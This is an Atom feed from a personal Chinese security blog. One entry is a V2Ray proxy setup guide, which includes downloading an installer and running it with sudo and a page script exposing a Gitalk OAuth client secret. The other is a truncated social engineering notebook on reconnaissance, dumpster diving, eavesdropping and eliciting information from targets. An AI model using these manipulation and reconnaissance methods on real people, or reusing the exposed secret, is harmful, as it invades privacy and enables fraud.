<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Shadow Gallery</title>
  
  <subtitle>Live in the shadow</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://srpopty.github.io/"/>
  <updated>2020-03-11T13:19:42.399Z</updated>
  <id>https://srpopty.github.io/</id>
  
  <author>
    <name>Srpopty</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>V2Ray搭建记录</title>
    <link href="https://srpopty.github.io/2019/09/25/V2Ray%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"/>
    <id>https://srpopty.github.io/2019/09/25/V2Ray%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/</id>
    <published>2019-09-25T12:11:40.000Z</published>
    <updated>2020-03-11T13:19:42.399Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>注意：首先需要有一台没有被封的VPS</p><h2 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h2><ol><li>登录VPS</li><li>下载官方提供的安装脚本<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://install.direct/go.sh</span><br></pre></td></tr></table></figure></li><li>安装<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bash go.sh</span><br></pre></td></tr></table></figure>如果安装失败，会出现红色字体的提示，基本都可以自己手动解决</li></ol><h2 id="Client-Windows"><a href="#Client-Windows" class="headerlink" title="Client(Windows)"></a>Client(Windows)</h2><ol><li>在<a href="https://github.com/v2ray/v2ray-core/releases" target="_blank" rel="noopener">这里</a>下载v2ray-windows-64.zip</li><li>解压</li></ol><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><h2 id="Server-1"><a href="#Server-1" class="headerlink" title="Server"></a>Server</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/v2ray/config.json</span><br></pre></td></tr></table></figure><p>配置文件如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"inbounds"</span>: [&#123;</span><br><span class="line">    <span class="attr">"port"</span>: *****, <span class="comment">// 服务器端口</span></span><br><span class="line">    <span class="attr">"protocol"</span>: <span class="string">"vmess"</span>, <span class="comment">// 使用vmess协议</span></span><br><span class="line">    <span class="attr">"settings"</span>: &#123;</span><br><span class="line">      <span class="attr">"clients"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"id"</span>: <span class="string">"********-****-****-****-************"</span>, <span class="comment">// UUID格式的id，相当于password</span></span><br><span class="line">          <span class="attr">"level"</span>: <span class="number">1</span>,</span><br><span class="line">          <span class="attr">"alterId"</span>: <span class="number">64</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  <span class="attr">"outbounds"</span>: [&#123;</span><br><span class="line">    <span class="attr">"protocol"</span>: <span class="string">"freedom"</span>,</span><br><span class="line">    <span class="attr">"settings"</span>: &#123;&#125;</span><br><span class="line">  &#125;,&#123;</span><br><span class="line">    <span class="attr">"protocol"</span>: <span class="string">"blackhole"</span>,</span><br><span class="line">    <span class="attr">"settings"</span>: &#123;&#125;,</span><br><span class="line">    <span class="attr">"tag"</span>: <span class="string">"blocked"</span></span><br><span class="line">  &#125;],</span><br><span class="line">  <span class="attr">"routing"</span>: &#123;</span><br><span class="line">    <span class="attr">"rules"</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"field"</span>,</span><br><span class="line">        <span class="attr">"ip"</span>: [<span class="string">"geoip:private"</span>],</span><br><span class="line">        <span class="attr">"outboundTag"</span>: <span class="string">"blocked"</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改好合适的端口后，使用如下命令启动V2Ray服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start v2ray</span><br></pre></td></tr></table></figure><h2 id="Client-Windows-1"><a href="#Client-Windows-1" class="headerlink" title="Client(Windows)"></a>Client(Windows)</h2><p>修改解压出来的目录下的config.json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Config file of V2Ray. This file follows standard JSON format, with comments support.</span></span><br><span class="line"><span class="comment">// Uncomment entries below to satisfy your needs. Also read our manual for more detail at</span></span><br><span class="line"><span class="comment">// https://www.v2ray.com/</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"log"</span>: &#123;</span><br><span class="line">    <span class="comment">// By default, V2Ray writes access log to stdout.</span></span><br><span class="line">    <span class="comment">// "access": "/path/to/access/log/file",</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// By default, V2Ray write error log to stdout.</span></span><br><span class="line">    <span class="comment">// "error": "/path/to/error/log/file",</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Log level, one of "debug", "info", "warning", "error", "none"</span></span><br><span class="line">    <span class="attr">"loglevel"</span>: <span class="string">"warning"</span>,</span><br><span class="line">    <span class="attr">"access"</span>: <span class="string">".\\access.log"</span>, <span class="comment">// 设置access日志的位置</span></span><br><span class="line">    <span class="attr">"error"</span>: <span class="string">".\\error.log"</span> <span class="comment">// 设置error日志的位置</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// List of inbound proxy configurations.</span></span><br><span class="line">  <span class="attr">"inbounds"</span>: [&#123;</span><br><span class="line">    <span class="comment">// Port to listen on. You may need root access if the value is less than 1024.</span></span><br><span class="line">    <span class="attr">"port"</span>: <span class="number">1080</span>, <span class="comment">// 设置本地端口</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// IP address to listen on. Change to "0.0.0.0" to listen on all network interfaces.</span></span><br><span class="line">    <span class="attr">"listen"</span>: <span class="string">"127.0.0.1"</span>, <span class="comment">// 本地监听地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Tag of the inbound proxy. May be used for routing.</span></span><br><span class="line">    <span class="attr">"tag"</span>: <span class="string">"socks-inbound"</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Protocol name of inbound proxy.</span></span><br><span class="line">    <span class="attr">"protocol"</span>: <span class="string">"socks"</span>, <span class="comment">// 本地使用Socks 5协议</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Settings of the protocol. Varies based on protocol.</span></span><br><span class="line">    <span class="attr">"settings"</span>: &#123;</span><br><span class="line">      <span class="attr">"auth"</span>: <span class="string">"noauth"</span>, <span class="comment">// 不需要认证</span></span><br><span class="line">      <span class="attr">"udp"</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">"ip"</span>: <span class="string">"127.0.0.1"</span></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Enable sniffing on TCP connection.</span></span><br><span class="line">    <span class="attr">"sniffing"</span>: &#123;</span><br><span class="line">      <span class="attr">"enabled"</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="comment">// Target domain will be overriden to the one carried by the connection, if the connection is HTTP or HTTPS.</span></span><br><span class="line">      <span class="attr">"destOverride"</span>: [<span class="string">"http"</span>, <span class="string">"tls"</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  <span class="comment">// List of outbound proxy configurations.</span></span><br><span class="line">  <span class="attr">"outbounds"</span>: [&#123;</span><br><span class="line">    <span class="comment">// Protocol name of the outbound proxy.</span></span><br><span class="line">    <span class="attr">"protocol"</span>: <span class="string">"vmess"</span>, <span class="comment">// 使用Vmess协议</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Settings of the protocol. Varies based on protocol.</span></span><br><span class="line">    <span class="attr">"settings"</span>: &#123;</span><br><span class="line"><span class="comment">// ************************添加下面的代码*******************</span></span><br><span class="line">    <span class="attr">"vnext"</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">"address"</span>: <span class="string">"***.***.***.***"</span>, <span class="comment">// VPS地址</span></span><br><span class="line">            <span class="attr">"port"</span>: *****, <span class="comment">// VPS监听端口</span></span><br><span class="line">            <span class="attr">"users"</span>: [</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="attr">"id"</span>: <span class="string">"********-****-****-****-************"</span>, <span class="comment">// UUID格式的ID，同服务器配置的一致</span></span><br><span class="line">                <span class="attr">"alterId"</span>: <span class="number">64</span> <span class="comment">// 同服务器配置的一致</span></span><br><span class="line">              &#125;</span><br><span class="line">            ]</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line"><span class="comment">// ****************************添加上面的代码*******************</span></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Tag of the outbound. May be used for routing.</span></span><br><span class="line">    <span class="attr">"tag"</span>: <span class="string">"direct"</span></span><br><span class="line">  &#125;,&#123;</span><br><span class="line">    <span class="attr">"protocol"</span>: <span class="string">"blackhole"</span>,</span><br><span class="line">    <span class="attr">"settings"</span>: &#123;&#125;,</span><br><span class="line">    <span class="attr">"tag"</span>: <span class="string">"blocked"</span></span><br><span class="line">  &#125;],</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Transport is for global transport settings. If you have multiple transports with same settings</span></span><br><span class="line">  <span class="comment">// (say mKCP), you may put it here, instead of in each individual inbound/outbounds.</span></span><br><span class="line">  <span class="comment">//"transport": &#123;&#125;,</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Routing controls how traffic from inbounds are sent to outbounds.</span></span><br><span class="line">  <span class="attr">"routing"</span>: &#123;</span><br><span class="line">    <span class="attr">"domainStrategy"</span>: <span class="string">"IPOnDemand"</span>,</span><br><span class="line">    <span class="attr">"rules"</span>:[</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// Blocks access to private IPs. Remove this if you want to access your router.</span></span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"field"</span>,</span><br><span class="line">        <span class="attr">"ip"</span>: [<span class="string">"geoip:private"</span>],</span><br><span class="line">        <span class="attr">"outboundTag"</span>: <span class="string">"blocked"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// Blocks major ads.</span></span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"field"</span>,</span><br><span class="line">        <span class="attr">"domain"</span>: [<span class="string">"geosite:category-ads"</span>],</span><br><span class="line">        <span class="attr">"outboundTag"</span>: <span class="string">"blocked"</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Dns settings for domain resolution.</span></span><br><span class="line">  <span class="attr">"dns"</span>: &#123;</span><br><span class="line">    <span class="comment">// Static hosts, similar to hosts file.</span></span><br><span class="line">    <span class="attr">"hosts"</span>: &#123;</span><br><span class="line">      <span class="comment">// Match v2ray.com to another domain on CloudFlare. This domain will be used when querying IPs for v2ray.com.</span></span><br><span class="line">      <span class="attr">"domain:v2ray.com"</span>: <span class="string">"www.vicemc.net"</span>,</span><br><span class="line"></span><br><span class="line">      <span class="comment">// The following settings help to eliminate DNS poisoning in mainland China.</span></span><br><span class="line">      <span class="comment">// It is safe to comment these out if this is not the case for you.</span></span><br><span class="line">      <span class="attr">"domain:github.io"</span>: <span class="string">"pages.github.com"</span>,</span><br><span class="line">      <span class="attr">"domain:wikipedia.org"</span>: <span class="string">"www.wikimedia.org"</span>,</span><br><span class="line">      <span class="attr">"domain:shadowsocks.org"</span>: <span class="string">"electronicsrealm.com"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"servers"</span>: [</span><br><span class="line">      <span class="string">"1.1.1.1"</span>,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"address"</span>: <span class="string">"114.114.114.114"</span>,</span><br><span class="line">        <span class="attr">"port"</span>: <span class="number">53</span>,</span><br><span class="line">        <span class="comment">// List of domains that use this DNS first.</span></span><br><span class="line">        <span class="attr">"domains"</span>: [</span><br><span class="line">          <span class="string">"geosite:cn"</span></span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">"8.8.8.8"</span>,</span><br><span class="line">      <span class="string">"localhost"</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Policy controls some internal behavior of how V2Ray handles connections.</span></span><br><span class="line">  <span class="comment">// It may be on connection level by user levels in 'levels', or global settings in 'system.'</span></span><br><span class="line">  <span class="attr">"policy"</span>: &#123;</span><br><span class="line">    <span class="comment">// Connection policys by user levels</span></span><br><span class="line">    <span class="attr">"levels"</span>: &#123;</span><br><span class="line">      <span class="attr">"0"</span>: &#123;</span><br><span class="line">        <span class="attr">"uplinkOnly"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"downlinkOnly"</span>: <span class="number">0</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"system"</span>: &#123;</span><br><span class="line">      <span class="attr">"statsInboundUplink"</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">"statsInboundDownlink"</span>: <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Stats enables internal stats counter.</span></span><br><span class="line">  <span class="comment">// This setting can be used together with Policy and Api. </span></span><br><span class="line">  <span class="comment">//"stats":&#123;&#125;,</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Api enables gRPC APIs for external programs to communicate with V2Ray instance.</span></span><br><span class="line">  <span class="comment">//"api": &#123;</span></span><br><span class="line">    <span class="comment">//"tag": "api",</span></span><br><span class="line">    <span class="comment">//"services": [</span></span><br><span class="line">    <span class="comment">//  "HandlerService",</span></span><br><span class="line">    <span class="comment">//  "LoggerService",</span></span><br><span class="line">    <span class="comment">//  "StatsService"</span></span><br><span class="line">    <span class="comment">//]</span></span><br><span class="line">  <span class="comment">//&#125;,</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// You may add other entries to the configuration, but they will not be recognized by V2Ray.</span></span><br><span class="line">  <span class="attr">"other"</span>: &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行v2ray.exe或者wv2ray.exe即可启动V2Ray</p><ul><li>v2ray.exe: 会打开一个命令行界面运行V2Ray</li><li>wv2ray.exe: 后台运行V2Ray</li></ul><p>Win+R打开运行<br>输入shell:startup运行<br>打开Windows启动目录<br>将wv2ray.exe的<strong>快捷方式</strong>放到该目录下即可开机后台自启动V2Ray</p><p>其余的就和shadowsocks的配置是一样的了，V2Ray在本地监听1080端口，使用SOCK5协议</p><hr><p>关于V2Ray详细的配置请参考<a href="https://toutyrater.github.io/" target="_blank" rel="noopener">https://toutyrater.github.io/</a></p><h1 id="IOS"><a href="#IOS" class="headerlink" title="IOS"></a>IOS</h1><p>直接使用Shadowrocket就可以<br>修改类型为Vmess协议<br>填写对应的ip，端口和uuid</p><h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><p>下载安装<a href="https://github.com/2dust/v2rayNG/releases" target="_blank" rel="noopener">v2rayNG</a><br>选择手动输入Vmess<br>填写对应的ip，端口，uuid和alterId</p><div id="gitalk-container"></div><script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><script>var gitalkConfig = {"clientID":"fb9b672afa74e328fbe8","clientSecret":"1fa3f067c53df3bd3686b004980eaca2fe8f5ede","repo":"srpopty.github.io","owner":"Srpopty","admin":["Srpopty"],"distractionFreeMode":false};    gitalkConfig.id = md5(location.pathname);var gitalk = new Gitalk(gitalkConfig);    gitalk.render("gitalk-container");    </script>]]></content>
    
    <summary type="html">
    
      可能由于最近马上就要到了祖国的生日了吧，再加上香港动乱，混乱的政治因素，总之出于各种奇怪的原因，墙是越来越高了。由于鄙人还在使用古老的shadowsocks技术，在Vultr买的VPS，买一台封一台，现在也不封端口了，直接失联了，ping都ping不通，想去外面看一看实在是麻烦，所以决定改换用V2Ray科学上网。
    
    </summary>
    
    
      <category term="hack" scheme="https://srpopty.github.io/categories/hack/"/>
    
    
      <category term="trick" scheme="https://srpopty.github.io/tags/trick/"/>
    
  </entry>
  
  <entry>
    <title>Social Engineering NoteBook</title>
    <link href="https://srpopty.github.io/2019/08/10/Social-Engineering-NoteBook/"/>
    <id>https://srpopty.github.io/2019/08/10/Social-Engineering-NoteBook/</id>
    <published>2019-08-10T08:06:37.000Z</published>
    <updated>2020-03-11T13:40:19.774Z</updated>
    
    <content type="html"><![CDATA[<p>Social Engineering NoteBook<br>Remember:<br>    Do not trust anyone.<br>    Never let them know what you are thinking.<br>    Keep slience forever.<br>                                    -Srpopty</p><hr><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h2><p><a href="https://www.google.com/" target="_blank" rel="noopener">Google</a><br>使用GoogleHacking进行被动的信息收集是最安全可靠的，但是收集的信息量有限，有时候需要根据经验以及推理进一步收集信息</p><ol><li><p>原则</p><ul><li>每次查询使用多关键词而不是句子<br>  例如”电脑 蓝屏 解决”的查询结果要比”电脑为什么蓝屏打不开”更好</li><li>尽量使用和查询有关的专有关键词以缩小范围<br>  例如”电脑 蓝屏”的查询结果要比”电脑 打不开”更加精确</li><li>查询尽量简洁，避免冗余关键词以增加不必要的查询结果</li><li>查询的拼写不一定准确(Google有自动纠错功能)</li></ul></li><li><p>技巧</p><ul><li>Google查询关键词的默认连接为”and”</li><li>Google会直接返回关键词匹配的结果而不会扩展关键词的意义(Google的简洁性)</li><li>Google在查询英文时会返回关键词的多种时态</li><li>Google会忽略终结符<br>  例如中文的”的”，”是”，”了”等虚词，英文的”is”，”to”等</li><li>Google每次查询的最大长度为32(超出部分截断)</li><li>两个关键词越近，优先级越高</li><li>关键词越靠前，优先级越高</li><li>Google大小写不敏感</li><li>Google会忽略部分标点符号，不会忽略单引号(‘)</li><li>Google会包含有或没有连字符(-)的结果<br>  例如查询”Mr-Li”，Google会返回”Mr-Li”和”Mr Li”的结果</li></ul></li><li><p>查询操作符</p></li></ol><table><thead><tr><th>操作符表示</th><th>操作符含义</th></tr></thead><tbody><tr><td>term1 term2或term1 and term2</td><td>同时查询包含term1和term2的结果</td></tr><tr><td>term1 | term2或term1 or term2</td><td>查询包含term1或包含term2的结果</td></tr><tr><td>“term”</td><td>强制查询结果中包含term</td></tr><tr><td>-term</td><td>强制查询结果中不包含term</td></tr><tr><td>~term</td><td>查询term或者term的同义词</td></tr><tr><td>number1..number2</td><td>数字范围</td></tr><tr><td>term1 * term2</td><td>代替任意长度字符</td></tr></tbody></table><ol start="4"><li>高级搜索符<blockquote><p>粗体为常用搜索符</p></blockquote></li></ol><table><thead><tr><th>搜索符表示</th><th>搜索符含义</th></tr></thead><tbody><tr><td>allinanchor:</td><td>后面所有的关键词都位于网页的超链接中</td></tr><tr><td>allintext:</td><td>后面所有的关键词都位于网页的文本中</td></tr><tr><td>allintitle:</td><td>后面所有的关键词度位于网页的标题中</td></tr><tr><td>allinurl:</td><td>后面所有的关键词都位于网页的url中</td></tr><tr><td>inanchor:</td><td>关键词位于网页的超链接中</td></tr><tr><td><strong>intext:</strong></td><td>关键词位于网页的文本中</td></tr><tr><td><strong>intitle:</strong></td><td>关键词位于网页的标题中</td></tr><tr><td><strong>inurl:</strong></td><td>关键词位于网页的url中</td></tr><tr><td><strong>cache:</strong></td><td>跳转到关键词url的网页缓存</td></tr><tr><td>define:</td><td>关键词的定义</td></tr><tr><td><strong>ext/filetype:</strong></td><td>文件类型为关键词的文件</td></tr><tr><td>movie:</td><td>关键词相关的电影</td></tr><tr><td>book:</td><td>关键词相关的书籍</td></tr><tr><td><strong>site:</strong></td><td>限定在关键词url的网站中搜索</td></tr><tr><td>related:</td><td>和关键词相关的网页</td></tr></tbody></table><hr><h2 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h2><p><a href="https://www.shodan.com/" target="_blank" rel="noopener">Shodan</a><br>检索服务器信息以及开放的端口</p><hr><h2 id="Whois"><a href="#Whois" class="headerlink" title="Whois"></a>Whois</h2><p><a href="https://www.whois.net/" target="_blank" rel="noopener">Whois</a><br>Whois可以查询域名以及域名所有人的信息</p><hr><h2 id="WayBack-Machine"><a href="#WayBack-Machine" class="headerlink" title="WayBack Machine"></a>WayBack Machine</h2><p><a href="https://archive.org/web/" target="_blank" rel="noopener">WayBack Machine</a><br>可以查询网站的历史归档，比GoogleCache更加久远</p><hr><h2 id="公共服务器"><a href="#公共服务器" class="headerlink" title="公共服务器"></a>公共服务器</h2><p>IP/域名/端口扫描</p><hr><h2 id="个人网站-博客"><a href="#个人网站-博客" class="headerlink" title="个人网站/博客"></a>个人网站/博客</h2><p>很多人都喜欢建立自己的个人网站或博客，将自己的信息展示给所有可以访问的人</p><hr><h2 id="公开报告"><a href="#公开报告" class="headerlink" title="公开报告"></a>公开报告</h2><p>结合GoogleHacking搜索目标企业或机构的公开报告</p><hr><h2 id="社交平台"><a href="#社交平台" class="headerlink" title="社交平台"></a>社交平台</h2><ul><li><a href="https://twitter.com/" target="_blank" rel="noopener">Twitter</a>/<a href="https://facebook.com" target="_blank" rel="noopener">FaceBook</a>/<a href="https://blippi.com/" target="_blank" rel="noopener">Blippy</a>/<a href="https://www.linkedin.com/" target="_blank" rel="noopener">LinkedIn</a>/<a href="https://myspace.com/" target="_blank" rel="noopener">MySpace</a>/<a href="http://pleaserobme.com/" target="_blank" rel="noopener">PleaseRobMe</a>/<a href="http://icanstalku.com/" target="_blank" rel="noopener">ICanStalkU</a>/<a href="https://www.youtube.com/" target="_blank" rel="noopener">YouTuBe</a>/<a href="https://www.wikipedia.org/" target="_blank" rel="noopener">WikiPedia</a>…</li><li>QQ/微信/新浪微博/百度贴吧/QQ空间…</li></ul><hr><h2 id="观察"><a href="#观察" class="headerlink" title="观察"></a>观察</h2><p>使用望远镜/监控/窃听等辅助设备远程观察</p><hr><h2 id="垃圾收集"><a href="#垃圾收集" class="headerlink" title="垃圾收集"></a>垃圾收集</h2><p>很多垃圾桶里也藏着宝贝，不要放过任何一张写着字纸与存储设备！<br>在一些大公司的垃圾桶里经常有没有完全被碎纸机销毁的重要档案，以及员工丢弃的U盘/移动硬盘等存储设备，经过数据恢复后可以获取重要信息。</p><hr><h2 id="交流"><a href="#交流" class="headerlink" title="交流"></a>交流</h2><p>所有人的身体和精神都存在着一个私密空间，通常这个私密空间里藏着很多重要的信息，交流就是试图闯入这个私密空间获取信息的过程。</p><ul><li><p>基本规则</p><ol><li>不要理所当然的认为目标与你的情况完全一样</li><li>不要理所当然的认为目标会按照你的方式接受与解释信息</li><li>交流不是一个绝对的，一成不变的过程</li><li>如果有多人参与交流，应始终假设每个参与者的情况各不相同</li></ol></li><li><p>香农-韦佛交流模型(鼻祖模型)<br><img src="/2019/08/10/Social-Engineering-NoteBook/0e02817f703d1e72ee30f68ecd10ab95.png" alt></p><ul><li><p>信息源: 创造信息</p></li><li><p>发送方: 将信息编码为信号</p></li><li><p>信道: 传输信号</p></li><li><p>接收方: 从信号中解码信息</p></li><li><p>目的地: 信息的重点</p><p>问题</p></li></ul><ol><li>技术问题: 信息发送的准确性</li><li>语义问题: 信息表达的准确性</li><li>效率问题: 接收到的信息对行为影响的有效性</li></ol></li><li><p>贝罗模型(SMCR发送者-信息-信道-接收者通信模型)</p><ul><li><p>S-信息源: 常规技巧/态度/知识/社交系统/文化</p></li><li><p>M-信息: 内容/元素/处理/结构/编码</p></li><li><p>C-信道: 看/听/触/闻/尝</p></li><li><p>R-接收方: 常规技巧/态度/知识/社交系统/文化</p><p>符号和标识的形式属性<br>符号/表情及其使用者之间的关系<br>符号和标识之间的联系及其含义</p></li></ul></li><li><p>通信的事物模型<br><img src="/2019/08/10/Social-Engineering-NoteBook/c049d4f97b7f00533569d804b393b65a.png" alt></p></li><li><p>制定交流模型</p><ul><li>信息源: 社会工程师</li><li>信道: 传达方式(语言/非语言)</li><li>信息: 向接收者传达的内容(命令)</li><li>接收者: 目标</li><li>反馈: 当有效地将信息传达出去后，希望目标给予的回应(预期结果)</li></ul></li></ul><h1 id="诱导"><a href="#诱导" class="headerlink" title="诱导"></a>诱导</h1><p>诱导是一种引发或诱发某种特定行为的刺激</p><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><ol><li>大部分人希望看上去比较有礼貌，尤其是对陌生人</li><li>专业人士希望自己看起来见多识广</li><li>如果得到赞赏，大部分人通常会更加乐意分享信息(多巴胺)</li><li>大部分人不会为了撒谎而撒谎</li><li>大部分人对貌似关心自己的人会比较友善</li></ol><hr><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><ol><li>表现得自然，不要紧张</li><li>拥有足够的知识背景(不能伪装成自己不可能成为的人)</li><li>切忌<strong>贪婪</strong></li></ol><hr><h2 id="铺垫"><a href="#铺垫" class="headerlink" 